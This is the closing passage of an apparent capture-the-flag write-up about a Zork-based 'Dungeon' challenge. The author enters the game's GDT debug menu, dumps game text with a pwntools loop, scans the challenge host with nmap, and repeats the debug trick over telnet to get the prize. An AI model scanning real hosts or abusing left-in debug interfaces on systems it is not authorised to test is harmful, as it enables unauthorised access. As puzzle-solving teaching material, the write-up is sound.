+  <li>If you want to go the extra mile, you can manually export variables such as $TERM, $LINE, $COLUMN but I find that to be not needed in most cases.</li>
+</ol>
+
+<iframe width="420" height="315" src="http://www.youtube.com/embed/2jQ2W5epPYc" frameborder="0" allowfullscreen=""></iframe>
+
+<p><a name="dungeon" class="jumptarget"></a></p>
+
+<h1 id="dungeon-server">Dungeon Server</h1>
+
+<p>This server was so simple, I’m almost positive I am missing something as there was really no exploit.  An elf gave us a text based dungeon game, saying that it is near impossible to beat.  Running the game and googling the first line (<code class="highlighter-rouge">You are in an open field west of a big white house with a boarded</code> ), revealed that the game was ZORK.  Going to Zork’s github page and looking at the source revealed that typing GDT in game, would bring you to a debug menu.</p>
+
+<p>Once in the debug menu I ran help, and saw there was a command “DT” which could extract text from the game.  I tested by extracting the first line of the game, then was curious what happened when I did a high number.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>root@kali:~/dungeon# ./dungeon
+chroot: No such file or directory
+Welcome to Dungeon.			This version created 11-MAR-78.
+You are in an open field west of a big white house with a boarded
+front door.
+There is a small wrapped mailbox here.
+&gt;GDT
+GDT&gt;DT
+Entry:    1
+Welcome to Dungeon.			This version created 11-MAR-78.
+GDT&gt;DT
+Entry:    99999
+Segmentation fault
+</pre></td></tr></tbody></table>
+</code></pre></div>
+<p>My guess was the link to the audio file was somewhere within the dungeon text, but I had no idea how high DT went.  So I used the python module pwntools to write an expect script to extract all the dungeon text.  The reason I used pwntools, instead of the regular python expect library was that incase this challenge involved some debugging, I’d already have the skeleton of my exploit script written.</p>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./dungeon'</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"GDT"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'GDT&gt;'</span><span class="p">)</span>
+<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="n">i</span><span class="o">+=</span><span class="mi">1</span> 
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'DT'</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Entry'</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+  <span class="k">print</span> <span class="n">i</span>
+  <span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'GDT&gt;'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span>
+</pre></td></tr></tbody></table>
+</code></pre></div>
+<p>When executing “DT 1024”, the elf tells us to try the online version for the true prize.  So I ran nmap against dungeon.northpolewonderland.com and saw I was able to play the game by telnetting to port 11111.  Luckily for us the online mode also had GDT Mode enabled, so grabbing the audio file was as simple as entering DT 1024.</p>
+
+<script type="text/javascript" src="https://asciinema.org/a/8f8zxm1rntqawrpsvorvdzbb4.js" id="asciicast-8f8zxm1rntqawrpsvorvdzbb4" async=""></script>
+
+<iframe width="420" height="315" src="http://www.youtube.com/embed/hWC7mlIYOtU" frameborder="0" allowfullscreen=""></iframe>
+
+
+		</article>
+		<footer>
+	<p>By Nick Ippolito</p>
+</footer>
+
+	</main>
+</body>
+
+</html>
